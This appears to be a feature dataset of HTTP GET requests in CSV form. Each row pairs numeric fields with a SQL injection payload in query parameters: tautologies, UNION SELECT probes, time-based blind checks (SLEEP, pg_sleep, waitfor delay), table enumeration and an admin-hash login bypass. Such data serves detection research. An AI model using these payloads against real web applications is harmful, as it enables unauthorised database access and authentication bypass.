100,1,200,5066,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
100,1,200,7655,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
100,1,200,6612,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
100,1,200,1607,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
100,1,200,6265,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
100,1,200,3908,30,2,13,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
43,1,200,6695,7,14,12,1,1,GET ?id=');waitfor delay '0:0:5'-- HTTP/1.1
43,1,200,4859,7,14,12,1,1,GET ?id=');waitfor delay '0:0:5'-- HTTP/1.1
43,1,200,1703,7,14,12,1,1,GET ?id=');waitfor delay '0:0:5'-- HTTP/1.1
43,1,200,1502,7,14,12,1,1,GET ?id=');waitfor delay '0:0:5'-- HTTP/1.1
43,1,200,5216,7,14,12,1,1,GET ?id=');waitfor delay '0:0:5'-- HTTP/1.1
69,2,200,4367,7,29,14,1,1,GET ?email=admin" or "1"="1&phone=");waitfor delay '0:0:5'-- HTTP/1.1
27,1,200,3401,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,2672,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,6544,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,1355,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,3541,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,3911,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,1450,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,2220,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,2760,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,2862,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
27,1,200,6717,7,7,4,1,1,GET ?email= or 1=1 HTTP/1.1
52,2,200,6138,19,12,8,1,1,GET ?email=or SLEEP(5)="&phone= ORDER BY 2  HTTP/1.1
49,2,200,7926,9,15,13,1,1,GET ?name=' or 'one'='one&tel= OR 1=0--  HTTP/1.1
45,1,200,3700,7,16,11,1,1,GET ?mail=");waitfor delay '0:0:5'-- HTTP/1.1
45,1,200,7448,7,16,11,1,1,GET ?mail=");waitfor delay '0:0:5'-- HTTP/1.1
45,1,200,7837,7,16,11,1,1,GET ?mail=");waitfor delay '0:0:5'-- HTTP/1.1
45,1,200,5418,7,16,11,1,1,GET ?mail=");waitfor delay '0:0:5'-- HTTP/1.1
45,1,200,4060,7,16,11,1,1,GET ?mail=");waitfor delay '0:0:5'-- HTTP/1.1
45,1,200,3662,7,16,11,1,1,GET ?mail=");waitfor delay '0:0:5'-- HTTP/1.1
45,1,200,6741,7,16,11,1,1,GET ?mail=");waitfor delay '0:0:5'-- HTTP/1.1
189,2,200,3103,60,10,18,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28#&phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5 HTTP/1.1
142,2,200,3140,33,9,16,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25-- &name= OR x=x HTTP/1.1
37,1,200,5448,7,11,9,1,1,GET ?id=1)) or pg_sleep(5)-- HTTP/1.1
37,1,200,2269,7,11,9,1,1,GET ?id=1)) or pg_sleep(5)-- HTTP/1.1
37,1,200,2041,7,11,9,1,1,GET ?id=1)) or pg_sleep(5)-- HTTP/1.1
37,1,200,1915,7,11,9,1,1,GET ?id=1)) or pg_sleep(5)-- HTTP/1.1
37,1,200,3883,7,11,9,1,1,GET ?id=1)) or pg_sleep(5)-- HTTP/1.1
37,1,200,2350,7,11,9,1,1,GET ?id=1)) or pg_sleep(5)-- HTTP/1.1
52,2,200,6562,21,9,6,1,1,GET ?email= ORDER BY 7 &pass= ORDER BY 26#  HTTP/1.1
101,1,200,7376,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
101,1,200,7448,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
101,1,200,5905,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
101,1,200,1578,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
101,1,200,4992,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
101,1,200,7119,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
25,1,200,3690,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,3523,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,2406,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,3018,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,1443,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,1094,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,7243,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,7326,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,7305,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,4586,7,7,4,1,1,GET ?account="^" HTTP/1.1
25,1,200,4568,7,7,4,1,1,GET ?account="^" HTTP/1.1
24,1,200,2201,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,4912,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,6710,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,1507,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,2315,7,7,4,2,1,GET login/?id=' HTTP/1.1
26,1,200,7604,7,7,4,2,1,GET login/?id=" # HTTP/1.1
26,1,200,1679,7,7,4,2,1,GET login/?id=" # HTTP/1.1
26,1,200,1895,7,7,4,2,1,GET login/?id=" # HTTP/1.1
26,1,200,1562,7,7,4,2,1,GET login/?id=" # HTTP/1.1
26,1,200,5276,7,7,4,2,1,GET login/?id=" # HTTP/1.1
26,1,200,3707,7,7,4,2,1,GET login/?id=" # HTTP/1.1
26,1,200,6147,7,7,4,2,1,GET login/?id=" # HTTP/1.1
172,2,200,5518,32,33,22,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24&code= and (select substring(@@version_1_1))='X' HTTP/1.1
26,1,200,5277,9,6,4,1,1,GET ?user= OR x=y HTTP/1.1
26,1,200,3236,9,6,4,1,1,GET ?user= OR x=y HTTP/1.1
26,1,200,3619,9,6,4,1,1,GET ?user= OR x=y HTTP/1.1
26,1,200,1035,9,6,4,1,1,GET ?user= OR x=y HTTP/1.1
26,1,200,4206,9,6,4,1,1,GET ?user= OR x=y HTTP/1.1
26,1,200,2762,9,6,4,1,1,GET ?user= OR x=y HTTP/1.1
26,1,200,7380,9,6,4,1,1,GET ?user= OR x=y HTTP/1.1
161,2,200,7080,69,7,24,1,1,GET ?tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16&name= UNION SELECT @@VERSION_SLEEP(5)_"'3'"# HTTP/1.1
115,2,200,5052,31,10,17,1,1,GET ?code=") or "1"="1&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
180,2,200,5008,52,9,25,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26&phone=%' AND 8310=8311 AND '%'=' HTTP/1.1
104,1,200,2540,8,57,17,1,1,GET ?password=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') -- HTTP/1.1
104,1,200,3765,8,57,17,1,1,GET ?password=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') -- HTTP/1.1
104,1,200,5672,8,57,17,1,1,GET ?password=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') -- HTTP/1.1
104,1,200,3408,8,57,17,1,1,GET ?password=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') -- HTTP/1.1
49,2,200,5040,14,11,8,1,1,GET ?email= ORDER BY 25-- &pass=" or 1=1 HTTP/1.1
24,1,200,7092,9,4,4,1,1,GET ?id= OR x=x HTTP/1.1
24,1,200,5874,9,4,4,1,1,GET ?id= OR x=x HTTP/1.1
24,1,200,1888,9,4,4,1,1,GET ?id= OR x=x HTTP/1.1
24,1,200,4088,9,4,4,1,1,GET ?id= OR x=x HTTP/1.1
24,1,200,7684,9,4,4,1,1,GET ?id= OR x=x HTTP/1.1
24,1,200,2366,9,4,4,1,1,GET ?id= OR x=x HTTP/1.1
55,2,200,2834,7,20,9,1,1,GET ?name=admin") or ("1"="1&phone=" or "x"="x HTTP/1.1
81,1,200,5680,39,5,14,2,1,GET ?email=AND 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1
81,1,200,7287,39,5,14,2,1,GET ?email=AND 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1
81,1,200,3535,39,5,14,2,1,GET ?email=AND 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1
81,1,200,1278,39,5,14,2,1,GET ?email=AND 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1
204,2,200,5999,86,15,38,2,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69)))&pass=admin" or "1"="1"/* HTTP/1.1
71,1,200,2793,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
71,1,200,4152,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
71,1,200,2009,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
71,1,200,1157,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
71,1,200,3006,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
71,1,200,4964,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
31,3,200,2267,7,8,8,2,1,GET ?mail='/*&pass="&" HTTP/1.1
91,1,200,7381,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,5273,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,7998,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,1809,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,1964,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,2809,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,2447,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,2941,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,5773,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,4521,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,1305,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,1162,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
34,1,200,7273,7,7,11,1,1,GET ?email=') or '1'='1-- HTTP/1.1
34,1,200,3824,7,7,11,1,1,GET ?email=') or '1'='1-- HTTP/1.1
34,1,200,7263,7,7,11,1,1,GET ?email=') or '1'='1-- HTTP/1.1
34,1,200,3310,7,7,11,1,1,GET ?email=') or '1'='1-- HTTP/1.1
34,1,200,6033,7,7,11,1,1,GET ?email=') or '1'='1-- HTTP/1.1
34,1,200,7576,7,7,11,1,1,GET ?email=') or '1'='1-- HTTP/1.1
34,1,200,4218,7,7,11,1,1,GET ?email=') or '1'='1-- HTTP/1.1
66,2,200,6108,27,10,10,1,1,GET ?email= AND 1=0#&phone= AS INJECTX WHERE 1=1 AND 1=0# HTTP/1.1
139,1,200,2103,31,4,13,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
139,1,200,7335,31,4,13,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
139,1,200,7842,31,4,13,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
139,1,200,4887,31,4,13,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
139,1,200,3532,31,4,13,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
111,1,200,5433,58,2,20,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
111,1,200,3572,58,2,20,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
111,1,200,3987,58,2,20,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
111,1,200,6392,58,2,20,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
111,1,200,6959,58,2,20,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
111,1,200,6141,58,2,20,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
198,2,200,6571,93,7,38,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69)))&id= ORDER BY 2--  HTTP/1.1
121,1,200,6989,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
121,1,200,2743,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
121,1,200,4976,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
121,1,200,2177,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
121,1,200,1288,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
31,1,200,6247,7,10,6,1,1,GET ?username=or 1=1-- HTTP/1.1
31,1,200,7737,7,10,6,1,1,GET ?username=or 1=1-- HTTP/1.1
31,1,200,4247,7,10,6,1,1,GET ?username=or 1=1-- HTTP/1.1
31,1,200,1997,7,10,6,1,1,GET ?username=or 1=1-- HTTP/1.1
31,1,200,2129,7,10,6,1,1,GET ?username=or 1=1-- HTTP/1.1
31,1,200,1448,7,10,6,1,1,GET ?username=or 1=1-- HTTP/1.1
70,1,200,6694,31,8,8,1,1,GET ?code=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- HTTP/1.1
70,1,200,4417,31,8,8,1,1,GET ?code=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- HTTP/1.1
70,1,200,7216,31,8,8,1,1,GET ?code=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- HTTP/1.1
70,1,200,3006,31,8,8,1,1,GET ?code=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- HTTP/1.1
70,1,200,7863,31,8,8,1,1,GET ?code=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- HTTP/1.1
34,1,200,2783,12,8,6,1,1,GET ?user=or pg_SLEEP(5)# HTTP/1.1
34,1,200,7238,12,8,6,1,1,GET ?user=or pg_SLEEP(5)# HTTP/1.1
34,1,200,3511,12,8,6,1,1,GET ?user=or pg_SLEEP(5)# HTTP/1.1
34,1,200,2436,12,8,6,1,1,GET ?user=or pg_SLEEP(5)# HTTP/1.1
34,1,200,1140,12,8,6,1,1,GET ?user=or pg_SLEEP(5)# HTTP/1.1
202,1,200,1822,94,5,40,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))--  HTTP/1.1
202,1,200,3457,94,5,40,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))--  HTTP/1.1
202,1,200,3623,94,5,40,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))--  HTTP/1.1
202,1,200,2502,94,5,40,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))--  HTTP/1.1
202,1,200,4375,94,5,40,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))--  HTTP/1.1
202,1,200,7948,94,5,40,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))--  HTTP/1.1
47,1,200,4332,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,1701,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,1718,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,1220,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,1127,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,5135,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,1416,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,2568,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,4301,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
47,1,200,6251,9,14,8,1,1,GET ?phone=benchmark(50000000_MD5(1))# HTTP/1.1
56,1,200,5441,14,22,7,1,1,GET ?email=' GROUP BY columnnames having 1=1 -- HTTP/1.1
56,1,200,4477,14,22,7,1,1,GET ?email=' GROUP BY columnnames having 1=1 -- HTTP/1.1
56,1,200,1630,14,22,7,1,1,GET ?email=' GROUP BY columnnames having 1=1 -- HTTP/1.1
56,1,200,4418,14,22,7,1,1,GET ?email=' GROUP BY columnnames having 1=1 -- HTTP/1.1
56,1,200,3422,14,22,7,1,1,GET ?email=' GROUP BY columnnames having 1=1 -- HTTP/1.1
56,1,200,1380,14,22,7,1,1,GET ?email=' GROUP BY columnnames having 1=1 -- HTTP/1.1
56,1,200,5628,14,22,7,1,1,GET ?email=' GROUP BY columnnames having 1=1 -- HTTP/1.1
147,4,200,5092,35,4,19,1,1,GET ?id=&&SLEEP(5)&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
96,1,200,3395,30,4,15,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
96,1,200,6376,30,4,15,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
96,1,200,5202,30,4,15,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
46,2,200,5899,12,14,11,1,1,GET ?name=' and a='a&tel=pg_SLEEP(5)# HTTP/1.1
65,2,200,7872,29,10,14,1,1,GET ?phone=" "&id=(SELECT * FROM (SELECT(SLEEP(5)))ecMj) HTTP/1.1
121,2,200,5623,31,43,19,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5#&pass=select current_setting('virtual_host'); HTTP/1.1
87,2,200,5787,7,53,12,1,1,GET ?email=1) or pg_sleep(5)--&phone=select system_user from sysibm.sysdummy1; HTTP/1.1
31,1,200,5180,14,2,4,1,1,GET ?id= ORDER BY 27#  HTTP/1.1
31,1,200,1677,14,2,4,1,1,GET ?id= ORDER BY 27#  HTTP/1.1
31,1,200,7277,14,2,4,1,1,GET ?id= ORDER BY 27#  HTTP/1.1
31,1,200,3131,14,2,4,1,1,GET ?id= ORDER BY 27#  HTTP/1.1
31,1,200,5265,14,2,4,1,1,GET ?id= ORDER BY 27#  HTTP/1.1
31,1,200,2748,14,2,4,1,1,GET ?id= ORDER BY 27#  HTTP/1.1
262,2,200,4662,110,14,57,1,1,GET ?email=') or ('a'='a&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))--  HTTP/1.1
39,1,200,1891,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
39,1,200,4884,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
39,1,200,4507,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
39,1,200,2018,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
39,1,200,3508,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
39,1,200,7834,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
39,1,200,3244,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
39,1,200,6902,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
39,1,200,2082,7,11,6,2,1,GET ?mail=admin") or "1"="1"/* HTTP/1.1
